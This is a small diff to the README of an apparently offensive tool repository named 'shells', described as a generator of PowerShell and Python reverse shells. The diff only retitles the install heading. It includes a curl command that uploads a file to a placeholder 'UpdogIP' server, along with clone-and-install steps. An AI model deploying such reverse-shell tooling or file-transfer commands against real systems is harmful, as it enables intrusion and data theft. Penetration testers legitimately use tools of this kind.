@@ -20,7 +20,7 @@ Especially nice when in need of PowerShell and Python revshells, which can be a 
 ```curl -F path="absolute path for Updog-folder" -F file=filename http://UpdogIP/upload```
  
  
-### To install
+### To install Shells
 	git clone https://github.com/4ndr34z/shells
 	cd shells
 	./install.sh
